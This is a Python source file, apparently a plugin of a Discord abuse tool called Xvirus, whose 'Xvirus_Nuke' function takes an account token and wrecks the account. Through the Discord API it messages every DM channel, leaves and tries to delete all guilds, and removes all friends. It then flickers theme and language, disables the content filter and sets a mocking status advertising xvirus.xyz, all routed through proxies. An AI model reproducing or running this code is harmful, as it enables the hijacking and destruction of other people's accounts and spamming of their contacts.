import random
import threading
from itertools import cycle

import requests
from colorama import Fore

from util.plugins.common import *


def Xvirus_Nuke():
    def CustomSeizure(token):
        print(f'{Fore.MAGENTA}Starting seizure mode {Fore.WHITE}(Switching on/off Light/dark mode)\n')
        t = threading.currentThread()
        while getattr(t, "do_run", True):
            modes = cycle(["light", "dark"])
            # cycle between light/dark mode and languages
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v10/users/@me/settings", proxies={"http": f'{proxy()}'},
                           headers=getheaders(token), json=setting)

    token = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
    validateToken(token)
    message_Content = str(input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message that will be sent to every friend: {Fore.RED}'))

    setTitle("Deploying Xvirus Nuke")
    print(f"Xvirus Nuke Deployed")
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token,))
        t.start()

    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v10/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v10/channels/' + channel['id'] + '/messages',
                          proxies={"http": f'{proxy()}'},
                          headers=headers,
                          data={"content": f"{message_Content}"})
            setTitle(f"Messaging " + channel['id'])
            print(f"{Fore.RED}Messaged ID: {Fore.WHITE}" + channel['id'] + Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.RED}Sent a Message to all available friends.\n")

    guildsIds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v10/users/@me/guilds/' + guild['id'],
                proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
            print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}" + guild['name'] + Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v10/guilds/' + guild['id'],
                            proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
            print(f'{Fore.RED}Deleted guild: {Fore.WHITE}' + guild['name'] + Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.YELLOW}Deleted/Left all available guilds.\n")

    friendIds = requests.get("https://discord.com/api/v10/users/@me/relationships",
                             proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v10/users/@me/relationships/' + friend['id'],
                proxies={"http": f'{proxy()}'}, headers=getheaders(token))
            setTitle(f"Removing friend: " + friend['user']['username'] + "#" + friend['user']['discriminator'])
            print(
                f"{Fore.GREEN}Removed friend: {Fore.WHITE}" + friend['user']['username'] + "#" + friend[
                    'user']['discriminator'] + Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.GREEN}Removed all available friends.\n")
    t.do_run = False
    requests.delete("https://discord.com/api/v10/hypesquad/online", proxies={"http": f'{proxy()}'},
                    headers=getheaders(token))
    setting = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        "custom_status": {"text": "I got fucked by Xvirus https://xvirus.xyz"},
        'status': "idle"
    }
    requests.patch("https://discord.com/api/v10/users/@me/settings", proxies={"http": f'{proxy()}'},
                   headers=getheaders(token), json=setting)
    j = requests.get("https://discord.com/api/v10/users/@me", proxies={"http": f'{proxy()}'},
                     headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']
    setTitle(f"Xvirus Nuke Successfully Detonated!")
    print_slow(f"{Fore.GREEN}Successfully turned {a} into a chaotic wasteland ")
    print("Enter anything to continue. . . ", end="")
    input()